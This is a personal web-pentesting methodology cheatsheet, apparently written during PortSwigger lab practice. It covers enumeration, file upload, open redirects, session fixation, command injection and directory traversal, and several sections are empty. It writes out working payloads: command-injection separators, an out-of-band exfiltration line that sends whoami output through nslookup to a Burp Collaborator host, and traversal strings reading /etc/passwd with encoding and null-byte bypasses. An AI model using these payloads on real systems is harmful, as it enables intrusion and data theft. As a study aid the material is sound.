
# Methodology // Exploitation Cheatsheet

<details>
  <summary>Enumeration</summary>
  <br>
  
  ## Content discovery
  
   - What is the server running on?
   - Type of underlysing software? 
   - Versions?
  
  ## Vulnerability scanning
  
   - Nikto 

  
  [Visual site mapper](http://www.visualsitemapper.com/)
  
  Wappalyzer extension for server/web app details
  
  ## Subdomain discovery
  
  - Sublist3r (scraping)
  - SubFinder-o
  
  
  ## Directory discovery
  
  - dirbuster


  Screenshot tool for each subdomain/dir/updates
  
  Scanners (as long as the host is allows this)
   
    Burp scanning
    NMap scanning
    
</details>

<details>
<summary>Learning the application</summary>
  While running Burp, run through the site.
  How is everything handled? (pages, files, auth)
  What is the application for? (Photo storage, blog, store)
  
</details>


<details>
  <summary>Possible bug leads</summary>
  <br>
  
  **Check Burps passive scanner to see if anything sticks out.**
  
  **Login page**
    Injection possible?
    Type of DB?
  
  **User input/ input that stays on page**
  
  **Cookies**
  
  **Ability to upload files**
  
  **URL tells**
  
  **40X unauthorized pages**
    Verb tampering
  
</details>

<details>
  <summary>XSS</summary>
  <br>
  Cheatsheet:
   
   [Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

</details>

<details>
  <summary>Parameters</summary>
  <br>
  
  Garbage info ( symbols, negative intigers)
  
  Other account tokens, token mixing
  
  HPP
  
</details>


<details>
  <summary>File Upload</summary>
  <br>
  
  Things to think about:
  
    - File size limit for DoS
  
    - Santized filenames ? buffer overflow
  
    - How are zip files handeled if accepted?
  
    - How are files renamed / accessed
  
    - Check Content-Type header
    
    - is it a blacklist or a whitelist
    
    - How are the files being varified? Name, POST form or file content?
  
  Payloads: 
 
  
</details>


<details>
  <summary>Open redirects</summary>
  <br>
 
  If the site redirects.
  
  Server side: 
   
    - Referer in Http request
    - Checking if only relative / are allowed. // is a protocol agnostic, absolute URL. Try that.
  
  Client side:
  
    - window.location how is it checked? 
    
    
</details>

<details>
  <summary>Privilege Escalation</summary>
  <br>
  
  Cookies:
     How are sessions being held in cookies. Vuln to tampering (no digital sig)?
     What other info is in the cookies? 
     Try to see if the server will take untrusted data from your requests.
     Encrypted?
      
  <details>
  <summary>Try Horizontal escalation:</summary>
  <br>
  Horizontal privilege escalation occurs when an application allows the attacker to gain access to resources which normally would have been protected from an application or user. The result is that the application performs actions with the same but different security context than intended by the application developer or system administrator; this is effectively a limited form of privilege escalation (specifically, the unauthorized assumption of the capability of impersonating other users). 
  </details>   

  Finding a way tio make requests as an admin 
   
  <details>
  <summary>Vertical Escalation</summary>
  <br>
  This type of privilege escalation occurs when the user or process is able to obtain a higher level of access than an administrator or system developer intended, possibly by performing kernel-level operations. 
  </details>
</details>

<details>
  <summary>Session Fixation</summary>
  <br>
  
  Can you take control of an authenticated users session using the sessionID.
  
  - Use the sessionID that has already been established
  
  - Craft a sessionID and see if that sticks. i.e www.site.com/login?jsessionID=CraftedID 
    Login and see if the sessionID stays the same.
  
</details>


<details>
  <summary>Command Injection</summary>
  <br>

 Areas with user input that could have its handleing manipulated to run an OS command.

   Parrameters sent such as those in URLs i.e ?filename=  or user input.
  
  Command seperators which allow for commands to be chained together. 
   nix/Windows
   
    & 
    && (extra & separates the injected command from whatever follows the injection point.)
    |
    ||
    
   Unix
    
    ;
    0x0a or /n (newline)
    
   Unix. Back ticks or dollar character can be used to perform inline execution of an injected command within the original command. 
     
    ' Command ' 
    $(Command)
    
  Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

 Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to  terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 


  Useful commands 

    Purpose of command 	Linux 	Windows
    Name of current user 	whoami 	whoami
    Operating system 	uname -a 	ver
    Network configuration 	ifconfig 	ipconfig /all
    Network connections 	netstat -an 	netstat -an
    Running processes 	ps -ef 	tasklist 
    
   Blind:
    
   wait X seconds to test
   
     ping -c X 127.0.0.1 
     
   Rediecting blind output
   
    whoami > /<writable folder>
    
    Then naviage to that file  www.example.ca/<writeable file>
     
     
   Note that the file may only be accessable how the server allows it to be accessed. 
   Example: you write to an image directory but the server only allows the files to be accessed via 
      
       /image?filename=myfile.txt 
       so /image/myfile.txt may not work.
   
   Out-of-band
   
   Having the server interact with another system you control 
   
    ping BurpCollab
    
   Exfultrate data using out-of-band
   
    $(nslookup `whoami`.c2f2evzg76x5nz0z7m8uwsvvrmxdl2.burpcollaborator.net)
     
   Which will result in this request to my DNS server
    
   [![DNS-request.png](https://i.postimg.cc/L41gCYwc/DNS-request.png)](https://postimg.cc/23C536zG)

</details>

<details>
  <summary>Directory Traversal</summary>
  <br>
  Allows the reading of files on the server that is running the vulnerable application by manipulating a parameter. 
 
     /image?filename=../../../etc/passwd
 
 Attempt with abosule and relative paths as one or the other may be blocked/not blocked.
 
 Bypassing stripped traversal
 
  ....// and ...\/ will strip the detected ../ and ..\ from the centre and the outsides will come together to make ../.
  If what gets parsed / removed is responded use that to try to find a way to bypass. 
  
  encoding:
  
    ..%252f (takes away the 25 and you are left with the / encodded)
    ..%c0%af
  
  Some applications transmit the full path via the request, you may need to append your traversal to that.
 
    /image?filename=/var/www/images/../../../../etc.passwd
    
  Bypass required endings to a file
  
   %00 (null byte)
   
    passwd%00.png
    
  Note that depending on how the server sends thse back you may have to curl the request.
  
    curl https://ac8d1f3e1f7f4d4080c322dc0035009c.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg

 
</details>

<details>
  <summary>Sub Domain Takeover</summary>
  <br>
  
  If a sub domain that is found belonging to a target that is unused may be vulnerable to sub domain takeover. 
  
  Signs: 
  
  Exploit:
</details>


<details>
  <summary>SSRF</summary>
  <br>
</details>


<details>
  <summary></summary>
  <br>
</details>